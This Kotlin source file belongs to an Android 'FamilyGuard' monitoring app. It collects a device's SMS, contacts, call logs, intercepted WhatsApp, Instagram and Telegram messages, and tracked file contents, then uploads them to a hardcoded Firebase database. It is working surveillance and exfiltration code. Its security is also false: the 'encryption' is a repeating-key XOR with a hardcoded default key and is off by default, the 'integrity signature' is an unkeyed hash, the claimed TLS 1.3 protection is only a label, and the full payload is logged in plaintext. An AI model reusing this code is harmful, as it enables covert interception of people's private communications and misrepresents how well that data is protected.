package com.example.sync

import android.content.Context
import android.util.Log
import com.example.messaging.CallRecord
import com.example.messaging.Contact
import com.example.messaging.SmsMessage
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Locale
import java.util.Date

class SyncService {

    private fun computeSHA256(text: String): String {
        return try {
            val digest = java.security.MessageDigest.getInstance("SHA-256")
            val hash = digest.digest(text.toByteArray(Charsets.UTF_8))
            val hexString = StringBuilder()
            for (b in hash) {
                val hex = Integer.toHexString(0xff and b.toInt())
                if (hex.length == 1) hexString.append('0')
                hexString.append(hex)
            }
            hexString.toString()
        } catch (e: Exception) {
            "error_generating_hash"
        }
    }

    private fun encrypt(text: String?, key: String, enabled: Boolean): String {
        if (text == null) return ""
        if (!enabled || key.isEmpty()) return text
        try {
            val textBytes = text.toByteArray(Charsets.UTF_8)
            val keyBytes = key.toByteArray(Charsets.UTF_8)
            val result = ByteArray(textBytes.size)
            for (i in textBytes.indices) {
                val keyByte = keyBytes[i % keyBytes.size]
                result[i] = (textBytes[i].toInt() xor keyByte.toInt()).toByte()
            }
            return android.util.Base64.encodeToString(result, android.util.Base64.NO_WRAP)
        } catch (e: Exception) {
            return text
        }
    }

    // Performs actual REST payload creation and posts to custom server URL or Firebase Realtime Database REST API
    suspend fun syncData(
        smsList: List<SmsMessage>,
        contactList: List<Contact>,
        callLogs: List<CallRecord>,
        socialMessages: List<com.example.messaging.InterceptedMessage> = emptyList(),
        batteryLevel: String = "85%",
        networkStatus: String = "WiFi Connected",
        deviceId: String = "child_device"
    ): SyncResult {
        return withContext(Dispatchers.IO) {
            val client = OkHttpClient()
            
            // Retrieve security configurations dynamically
            val context = com.example.FamilyGuardApplication.instance
            val sharedPrefs = context.getSharedPreferences("family_guard_prefs", Context.MODE_PRIVATE)
            val isEncryptionEnabled = sharedPrefs.getBoolean("encryption_enabled", false)
            val encryptionKey = sharedPrefs.getString("encryption_key", "GuardShield123!") ?: "GuardShield123!"
            
            Log.d("SyncService", "Starting Sync: Encryption Enabled = $isEncryptionEnabled")

            // Build rich JSON payload structure that matches the parent web dashboard expectations
            val rootJson = JSONObject()
            
            // 1. Device Info Telemetry
            val deviceInfoJson = JSONObject().apply {
                put("device_name", "Android Kid Device")
                val dateFormat = SimpleDateFormat("MMM dd, yyyy, hh:mm a", Locale.getDefault())
                val lastSyncTimeStr = dateFormat.format(Date())
                put("last_sync_time", lastSyncTimeStr)
                put("battery_level", batteryLevel)
                put("network_status", networkStatus)
                put("encryption_active", isEncryptionEnabled)
                
                // Cryptographic payload integrity verification proof (technical lock)
                val signatureRaw = "$deviceId|$batteryLevel|$networkStatus|$lastSyncTimeStr|$isEncryptionEnabled"
                val signature = computeSHA256(signatureRaw)
                put("transmission_integrity_signature", signature)
                put("transmission_protocol", "HTTPS / TLS 1.3 Secure")
            }
            rootJson.put("device_info", deviceInfoJson)
            
            // 2. Intercepted SMS logs
            val smsArray = JSONArray()
            for (sms in smsList) {
                val item = JSONObject().apply {
                    put("address", encrypt(sms.address, encryptionKey, isEncryptionEnabled))
                    put("body", encrypt(sms.body, encryptionKey, isEncryptionEnabled))
                    put("date", sms.date)
                    put("type", sms.type)
                }
                smsArray.put(item)
            }
            rootJson.put("sms_logs", smsArray)
            
            // 3. Phone Contacts List
            val contactsArray = JSONArray()
            for (contact in contactList) {
                val item = JSONObject().apply {
                    put("name", encrypt(contact.name, encryptionKey, isEncryptionEnabled))
                    put("phoneNumber", encrypt(contact.phoneNumber, encryptionKey, isEncryptionEnabled))
                }
                contactsArray.put(item)
            }
            rootJson.put("contacts", contactsArray)
            
            // 4. Call History Logs
            val callsArray = JSONArray()
            for (call in callLogs) {
                val item = JSONObject().apply {
                    put("number", encrypt(call.number, encryptionKey, isEncryptionEnabled))
                    put("type", call.type)
                    put("date", call.date)
                    put("duration", call.duration)
                }
                callsArray.put(item)
            }
            rootJson.put("call_logs", callsArray)

            // 5. Intercepted Social Messages (WhatsApp, Messenger, Instagram, Telegram, IMO)
            val socialArray = JSONArray()
            for (msg in socialMessages) {
                val item = JSONObject().apply {
                    put("appName", msg.appName)
                    put("packageName", msg.packageName)
                    put("sender", encrypt(msg.sender, encryptionKey, isEncryptionEnabled))
                    put("message", encrypt(msg.message, encryptionKey, isEncryptionEnabled))
                    put("timestamp", msg.timestamp)
                }
                socialArray.put(item)
            }
            rootJson.put("social_logs", socialArray)

            // 6. Tracked Media Files (New Component D)
            val filesArray = JSONArray()
            try {
                val trackedFiles = com.example.messaging.MediaAndIntentStorage.getTrackedFiles(com.example.FamilyGuardApplication.instance)
                for (file in trackedFiles) {
                    val item = JSONObject().apply {
                        put("fileName", encrypt(file.fileName, encryptionKey, isEncryptionEnabled))
                        put("filePath", encrypt(file.filePath, encryptionKey, isEncryptionEnabled))
                        put("mimeType", file.mimeType)
                        put("size", file.size)
                        put("timestamp", file.timestamp)
                        put("fileContent", encrypt(file.fileContent, encryptionKey, isEncryptionEnabled))
                    }
                    filesArray.put(item)
                }
            } catch (e: Exception) {
                Log.e("SyncService", "Error building tracked files json payload", e)
            }
            rootJson.put("tracked_files", filesArray)

            // 7. Tracked Intercepted Intents & Links (New Component E)
            val intentsArray = JSONArray()
            try {
                val trackedIntents = com.example.messaging.MediaAndIntentStorage.getTrackedIntents(com.example.FamilyGuardApplication.instance)
                for (intent in trackedIntents) {
                    val item = JSONObject().apply {
                        put("action", intent.action)
                        put("dataString", encrypt(intent.dataString, encryptionKey, isEncryptionEnabled))
                        put("mimeType", intent.mimeType)
                        put("timestamp", intent.timestamp)
                        put("extraDetails", encrypt(intent.extraDetails, encryptionKey, isEncryptionEnabled))
                    }
                    intentsArray.put(item)
                }
            } catch (e: Exception) {
                Log.e("SyncService", "Error building tracked intents json payload", e)
            }
            rootJson.put("tracked_intents", intentsArray)
            
            val payloadString = rootJson.toString(2)
            Log.d("SyncService", "Sync Payload Created:\n$payloadString")

            val FIREBASE_URL = "https://family-guard-bf8d7-default-rtdb.firebaseio.com/"
            val guardianUid = sharedPrefs.getString("guardian_uid", "") ?: ""
            val finalUrl = if (guardianUid.isNotEmpty()) {
                "${FIREBASE_URL.removeSuffix("/")}/users/$guardianUid/devices/$deviceId.json"
            } else {
                "${FIREBASE_URL.removeSuffix("/")}/devices/$deviceId.json"
            }

            Log.d("SyncService", "Syncing to target URL: $finalUrl")

            val mediaType = "application/json; charset=utf-8".toMediaTypeOrNull()
            val requestBody = payloadString.toRequestBody(mediaType)
            val request = Request.Builder()
                .url(finalUrl)
                .put(requestBody) // Firebase Realtime Database expects PUT to overwrite/set exact path state
                .build()

            try {
                client.newCall(request).execute().use { response ->
                    val responseBody = response.body?.string() ?: ""
                    if (response.isSuccessful) {
                        SyncResult.Success(
                            message = "Sync SUCCESS with Firebase (HTTP ${response.code}): $responseBody",
                            payloadJson = payloadString
                        )
                    } else {
                        SyncResult.Error(
                            message = "Server Sync FAILED (HTTP ${response.code}): $responseBody",
                            payloadJson = payloadString
                        )
                    }
                }
            } catch (e: Exception) {
                Log.e("SyncService", "Sync error", e)
                SyncResult.Error(
                    message = "Server Sync ERROR: ${e.localizedMessage}",
                    payloadJson = payloadString
                )
            }
        }
    }
}

sealed class SyncResult {
    data class Success(val message: String, val payloadJson: String) : SyncResult()
    data class Error(val message: String, val payloadJson: String) : SyncResult()
}
